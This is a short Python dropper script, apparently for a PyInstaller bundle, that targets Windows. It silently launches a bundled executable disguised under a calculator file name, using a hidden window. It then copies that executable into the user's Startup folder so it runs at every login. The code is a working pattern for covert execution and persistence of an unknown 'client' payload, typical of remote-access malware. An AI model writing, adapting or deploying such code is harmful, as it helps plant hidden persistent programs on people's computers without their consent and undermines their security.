import subprocess
import os
import platform
import shutil
import sys
try:
    # Launch the client windows startup
    if platform.system() != "Windows": exit()

    if hasattr(sys, "_MEIPASS") is False: exit()
    
    executable = os.path.join(sys._MEIPASS, "calculator-20241007184404.exe")
  
    startup_folder = os.path.join(
        os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    )

    print(startup_folder)

    subprocess.Popen([executable], creationflags=subprocess.CREATE_NO_WINDOW)

    shutil.copy(executable, startup_folder + "\\calculator-20241007184404.exe")

    print("Client launched successfully")


except Exception as e:
    print(e)
